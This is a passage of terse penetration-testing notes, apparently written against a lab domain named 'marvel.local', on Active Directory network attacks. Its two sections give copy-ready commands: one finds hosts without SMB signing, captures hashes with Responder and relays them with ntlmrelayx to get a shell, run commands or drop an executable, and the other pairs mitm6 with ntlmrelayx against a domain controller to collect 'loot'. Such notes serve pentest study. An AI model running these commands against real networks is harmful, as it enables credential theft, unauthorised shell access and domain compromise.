...
## SMB Relay Attack
Relay collected hashes to dump sam files or get a shell
 * Must find targets that dont have smb signing enabled
```
nmap --script=smb2-security-mode.nse -p445 192.168.57.0/24
```
 * Capture hashes with responder but turn off smb and http servers in config file
```
responder -I tun0 -rdw -v
```
 * Use ntlmrelayx.py to relay those hashes collected
```
ntlmrelayx.py -tf targets.txt -smb2support -i ( i is for interactive/shell) -c ( run command ) -t ( download a exe to spawn a shell )
```

## IPV6 Attacks
Use mitm6 along with ntlrelayx.py to gather all kinds of goodies
 * Launch mitm6
```
python mitm6.py -d domain
```
 * Use ntlmrelayx.py to relay hashes and collect loot in the lootme file
```
ntlmrelayx.py -6 -t ldaps:// ip of domain controller -wh fakewpad.marvel.local -l lootme
```
